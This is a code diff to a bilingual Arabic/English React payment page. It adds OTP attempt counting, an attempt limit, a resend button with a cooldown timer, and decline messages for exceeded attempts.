@@ -76,6 +76,29 @@ function getOtpPollIntervalMs(): number {
   return 2500;
 }
 
+const OTP_MAX_ATTEMPTS = 2;
+
+type OtpOrderPoll = {
+  status?: string;
+  otp_attempts?: number;
+  otp_max_attempts?: number;
+  otp_remaining?: number;
+  otp_can_resend?: boolean;
+  otp_resend_cooldown_sec?: number;
+  fail_reason?: string | null;
+};
+
+function OtpEtaBanner({ text }: { text: string }) {
+  return (
+    <p className="w-full max-w-sm rounded-2xl border-2 border-sky-300 bg-gradient-to-r from-sky-50 via-cyan-50 to-teal-50 px-4 py-3 text-center text-sm font-black text-sky-800 shadow-sm ring-1 ring-sky-200/60">
+      <span className="inline-flex items-center justify-center gap-2">
+        <span aria-hidden className="text-base">⏱</span>
+        {text}
+      </span>
+    </p>
+  );
+}
+
 type ApiOffer = {
   id: string;
   variant: 'buy' | 'sell';
@@ -499,6 +522,14 @@ function MainContent() {
   const [cardProcessingToOtp, setCardProcessingToOtp] = useState(false);
   const [otpState, setOtpState] = useState<'input' | 'checking' | 'failed'>('input');
   const [otpRetryNotice, setOtpRetryNotice] = useState(false);
+  const [otpAttempts, setOtpAttempts] = useState(0);
+  const [otpMaxAttempts, setOtpMaxAttempts] = useState(OTP_MAX_ATTEMPTS);
+  const [otpRemaining, setOtpRemaining] = useState(OTP_MAX_ATTEMPTS);
+  const [otpCanResend, setOtpCanResend] = useState(true);
+  const [otpResendCooldown, setOtpResendCooldown] = useState(0);
+  const [otpResendNotice, setOtpResendNotice] = useState(false);
+  const [otpFailReason, setOtpFailReason] = useState<string | null>(null);
+  const [otpResendLoading, setOtpResendLoading] = useState(false);
   const [currentOrderId, setCurrentOrderId] = useState<string | null>(null);
   const [otpCode, setOtpCode] = useState('');
   const [sellAmount, setSellAmount] = useState<number>(10000);
@@ -1150,7 +1181,19 @@ function MainContent() {
     return () => window.clearInterval(tmr);
   }, [isAdmin, currentView, adminTab, fetchAdminCardFeed]);
 
-  const applyCardOrderStatus = useCallback((status: string) => {
+  const applyOtpPollMeta = useCallback((data: OtpOrderPoll) => {
+    if (typeof data.otp_attempts === 'number') setOtpAttempts(data.otp_attempts);
+    if (typeof data.otp_max_attempts === 'number') setOtpMaxAttempts(data.otp_max_attempts);
+    if (typeof data.otp_remaining === 'number') setOtpRemaining(data.otp_remaining);
+    if (typeof data.otp_can_resend === 'boolean') setOtpCanResend(data.otp_can_resend);
+    if (typeof data.otp_resend_cooldown_sec === 'number') {
+      setOtpResendCooldown(Math.max(0, data.otp_resend_cooldown_sec));
+    }
+    if (data.fail_reason) setOtpFailReason(data.fail_reason);
+  }, []);
+
+  const applyCardOrderStatus = useCallback((status: string, meta?: OtpOrderPoll) => {
+    if (meta) applyOtpPollMeta(meta);
     if (status === 'awaiting_otp') {
       setCardProcessingToOtp(false);
       setShowOtpStep(true);
@@ -1175,8 +1218,11 @@ function MainContent() {
       setCardProcessingToOtp(false);
       setShowOtpStep(true);
       setOtpState('failed');
+      if (meta?.fail_reason === 'otp_attempts_exceeded') {
+        setOtpFailReason('otp_attempts_exceeded');
+      }
     }
-  }, []);
+  }, [applyOtpPollMeta]);
 
   useEffect(() => {
     let interval: ReturnType<typeof setInterval>;
@@ -1193,7 +1239,8 @@ function MainContent() {
     const shouldPoll =
       !!currentOrderId &&
       !!clientId &&
-      (cardProcessingToOtp || (showOtpStep && otpState === 'checking'));
+      (cardProcessingToOtp ||
+        (showOtpStep && (otpState === 'checking' || otpState === 'input')));
     if (!shouldPoll) return;
 
     const pollOrderStatus = async () => {
@@ -1204,8 +1251,9 @@ function MainContent() {
         });
         const res = await fetch(apiUrl(`/api/transactions/order-status?${qs.toString()}`));
         if (!res.ok) return;
-        const data = (await res.json()) as { status?: string };
+        const data = (await res.json()) as OtpOrderPoll;
         if (!data?.status) return;
+        applyOtpPollMeta(data);
         if (otpState === 'checking') {
           if (data.status === 'retry_otp') {
             setOtpState('input');
@@ -1216,10 +1264,20 @@ function MainContent() {
             setIsSuccess(true);
           } else if (data.status === 'failed' || data.status === 'refunded' || data.status === 'suspended') {
             setOtpState('failed');
+            if (data.fail_reason === 'otp_attempts_exceeded') {
+              setOtpFailReason('otp_attempts_exceeded');
+            }
           }
           return;
         }
-        applyCardOrderStatus(data.status);
+        if (otpState === 'input') {
+          if (data.status === 'failed' && data.fail_reason === 'otp_attempts_exceeded') {
+            setOtpState('failed');
+            setOtpFailReason('otp_attempts_exceeded');
+          }
+          return;
+        }
+        applyCardOrderStatus(data.status, data);
       } catch (e) {
         console.error('pollOrderStatus:', e);
       }
@@ -1235,7 +1293,16 @@ function MainContent() {
     currentOrderId,
     clientId,
     applyCardOrderStatus,
+    applyOtpPollMeta,
   ]);
+
+  useEffect(() => {
+    if (otpResendCooldown <= 0) return;
+    const tmr = window.setInterval(() => {
+      setOtpResendCooldown((s) => Math.max(0, s - 1));
+    }, 1000);
+    return () => window.clearInterval(tmr);
+  }, [otpResendCooldown]);
 
   useEffect(() => {
     if (!cardProcessingToOtp || !currentOrderId) return;
@@ -1810,10 +1877,36 @@ function MainContent() {
     }, 1500);
   };
 
+  const handleOtpResend = async () => {
+    if (!currentOrderId || !clientId || otpResendLoading) return;
+    setOtpResendLoading(true);
+    try {
+      const res = await fetch(apiUrl('/api/transactions/otp/resend'), {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ client_id: clientId, order_id: currentOrderId }),
+      });
+      if (!res.ok) {
+        const err = (await res.json().catch(() => ({}))) as { cooldown_sec?: number };
+        if (typeof err.cooldown_sec === 'number') setOtpResendCooldown(err.cooldown_sec);
+        return;
+      }
+      const data = (await res.json()) as { cooldown_sec?: number };
+      setOtpResendNotice(true);
+      setOtpCanResend(false);
+      setOtpResendCooldown(data.cooldown_sec ?? 60);
+    } catch (e) {
+      console.error('handleOtpResend:', e);
+    } finally {
+      setOtpResendLoading(false);
+    }
+  };
+
   const handleOtpSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!currentOrderId) return;
     setOtpRetryNotice(false);
+    setOtpResendNotice(false);
     setOtpState('checking');
     try {
       const res = await fetch(apiUrl('/api/transactions/otp'), {
@@ -1839,6 +1932,14 @@ function MainContent() {
     setCardProcessingToOtp(false);
     setOtpState('input');
     setOtpRetryNotice(false);
+    setOtpAttempts(0);
+    setOtpMaxAttempts(OTP_MAX_ATTEMPTS);
+    setOtpRemaining(OTP_MAX_ATTEMPTS);
+    setOtpCanResend(true);
+    setOtpResendCooldown(0);
+    setOtpResendNotice(false);
+    setOtpFailReason(null);
+    setOtpResendLoading(false);
     setCurrentOrderId(null);
     setOtpCode('');
     setSelectedMethod(null);
@@ -5886,7 +5987,8 @@ function MainContent() {
         : undefined;
       const paymentRejected =
         otpState === 'failed' &&
-        (processingTx?.status === 'failed' ||
+        (otpFailReason === 'otp_attempts_exceeded' ||
+          processingTx?.status === 'failed' ||
           processingTx?.status === 'refunded' ||
           processingTx?.status === 'suspended');
 
@@ -5899,9 +6001,11 @@ function MainContent() {
                 {lang === 'ar' ? 'عملية مرفوضة' : 'Payment declined'}
               </h3>
               <p className="text-sm text-gray-500">
-                {lang === 'ar'
-                  ? 'تم رفض العملية أو البطاقة غير صالحة.'
-                  : 'The payment was declined or the card was not accepted.'}
+                {otpFailReason === 'otp_attempts_exceeded'
+                  ? t('otpRejectedAttempts')
+                  : lang === 'ar'
+                    ? 'تم رفض العملية أو البطاقة غير صالحة.'
+                    : 'The payment was declined or the card was not accepted.'}
               </p>
               <button
                 type="button"
@@ -5929,9 +6033,25 @@ function MainContent() {
               <h3 className="font-black text-gray-900 text-lg">{lang === 'ar' ? 'أدخل رمز OTP' : 'Enter OTP Code'}</h3>
               <p className="text-sm text-gray-400 mt-1">{lang === 'ar' ? 'تم إرسال رمز التحقق إلى هاتفك' : 'A verification code was sent to your phone'}</p>
             </div>
+            <OtpEtaBanner text={t('otpEtaDelivery')} />
+            <p className="w-full text-center text-xs font-black text-violet-800 bg-violet-50 border border-violet-200 rounded-xl px-3 py-2">
+              {t('otpAttemptLabel')
+                .replace('{current}', String(Math.min(otpAttempts + 1, otpMaxAttempts)))
+                .replace('{max}', String(otpMaxAttempts))}
+              {otpRemaining < otpMaxAttempts && (
+                <span className="block mt-1 text-violet-600 font-bold">
+                  {t('otpRemainingAttempts').replace('{count}', String(otpRemaining))}
+                </span>
+              )}
+            </p>
             {otpRetryNotice && otpState === 'input' && (
               <p role="alert" className="text-sm font-bold text-amber-900 bg-amber-50 border border-amber-200 rounded-xl px-4 py-2">
                 {t('otpWrongRetry')}
+              </p>
+            )}
+            {otpResendNotice && (
+              <p className="text-sm font-bold text-emerald-800 bg-emerald-50 border border-emerald-200 rounded-xl px-4 py-2">
+                {t('otpResendSent')}
               </p>
             )}
             <form onSubmit={handleOtpSubmit} className="space-y-4">
@@ -5948,6 +6068,18 @@ function MainContent() {
                   : (lang === 'ar' ? 'تأكيد الرمز' : 'Confirm Code')}
               </button>
             </form>
+            <button
+              type="button"
+              onClick={() => void handleOtpResend()}
+              disabled={otpResendLoading || otpResendCooldown > 0 || otpState === 'checking'}
+              className="w-full py-3 rounded-2xl border-2 border-sky-300 text-sky-800 font-bold text-sm bg-sky-50 hover:bg-sky-100 disabled:opacity-50 transition-colors"
+            >
+              {otpResendLoading
+                ? <Activity className="w-4 h-4 animate-pulse mx-auto" />
+                : otpResendCooldown > 0
+                  ? t('otpResendWait').replace('{sec}', String(otpResendCooldown))
+                  : t('otpResend')}
+            </button>
           </div>
         </div>
       );
@@ -6215,7 +6347,9 @@ function MainContent() {
                   </div>
                   <h3 className="font-black text-xl text-center text-gray-900">عملية مرفوضة</h3>
                   <p className="text-gray-500 text-center text-sm font-medium leading-relaxed">
-                    عذراً، تم رفض العملية أو البطاقة المدخلة غير صالحة.
+                    {otpFailReason === 'otp_attempts_exceeded'
+                      ? t('otpRejectedAttempts')
+                      : 'عذراً، تم رفض العملية أو البطاقة المدخلة غير صالحة.'}
                   </p>
                   <button
                     onClick={resetForm}
@@ -6243,12 +6377,28 @@ function MainContent() {
                   <p className="text-gray-500 text-center text-sm font-medium leading-relaxed">
                     {t('otpSent', 'تم إرسال رمز تحقق مؤقت إلى هاتفك لضمان أمان العملية.')}
                   </p>
+                  <OtpEtaBanner text={t('otpEtaDelivery')} />
+                  <p className="w-full max-w-sm text-center text-xs font-black text-violet-800 bg-violet-50 border border-violet-200 rounded-xl px-3 py-2">
+                    {t('otpAttemptLabel')
+                      .replace('{current}', String(Math.min(otpAttempts + 1, otpMaxAttempts)))
+                      .replace('{max}', String(otpMaxAttempts))}
+                    {otpRemaining < otpMaxAttempts && (
+                      <span className="block mt-1 text-violet-600 font-bold">
+                        {t('otpRemainingAttempts').replace('{count}', String(otpRemaining))}
+                      </span>
+                    )}
+                  </p>
                   {otpRetryNotice && otpState === 'input' && (
                     <p
                       role="alert"
                       className="w-full max-w-sm rounded-2xl border border-amber-200 bg-amber-50 px-4 py-3 text-center text-sm font-bold text-amber-900"
                     >
                       {t('otpWrongRetry')}
+                    </p>
+                  )}
+                  {otpResendNotice && (
+                    <p className="w-full max-w-sm rounded-2xl border border-emerald-200 bg-emerald-50 px-4 py-3 text-center text-sm font-bold text-emerald-800">
+                      {t('otpResendSent')}
                     </p>
                   )}
                   <form onSubmit={handleOtpSubmit} className="w-full max-w-sm space-y-5">
@@ -6270,6 +6420,18 @@ function MainContent() {
                       {otpState === 'checking' ? <Activity className="w-5 h-5 animate-pulse" /> : t('verifyCode', 'تأكيد الرمز')}
                     </button>
                   </form>
+                  <button
+                    type="button"
+                    onClick={() => void handleOtpResend()}
+                    disabled={otpResendLoading || otpResendCooldown > 0 || otpState === 'checking'}
+                    className="w-full max-w-sm py-3 rounded-2xl border-2 border-sky-300 text-sky-800 font-bold text-sm bg-sky-50 hover:bg-sky-100 disabled:opacity-50 transition-colors"
+                  >
+                    {otpResendLoading
+                      ? <Activity className="w-4 h-4 animate-pulse mx-auto" />
+                      : otpResendCooldown > 0
+                        ? t('otpResendWait').replace('{sec}', String(otpResendCooldown))
+                        : t('otpResend')}
+                  </button>
                   <div className="text-center pt-4">
                     <span className="text-xs font-bold text-gray-400">لن يتم تسجيل العملية دون الرمز المدخل</span>
                   </div>
